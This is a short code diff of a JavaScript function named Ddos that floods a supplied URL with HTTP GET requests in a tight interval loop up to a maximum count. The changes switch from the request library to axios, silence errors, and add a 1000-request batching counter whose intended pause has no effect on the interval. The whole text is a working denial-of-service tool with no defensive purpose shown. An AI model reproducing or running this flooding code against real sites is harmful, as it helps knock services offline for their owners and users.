@@ -1,15 +1,22 @@
-import request from "request";
+import axios from "axios";
 function Ddos(link, max) {
-  let failed = 0;
+  let count2 = 0;
   let count = 0;
-  let ok = 0;
+  let time = 0;
   const inter = setInterval(() => {
     count++;
-    request(link, (error) => (!error ? ok++ : failed++));
+    count2 = count2 + 1;
+    time = 0;
+    if(count2 >= 1000) {
+      time = 5000;
+      count2 = 0;
+    }
+    axios.get(link).catch(() => {
+    })
     if (count > max) {
       clearInterval(inter);
     }
-  }, 0);
+  }, time);
 }
 function isValidURL(str) {
   const urlPattern =
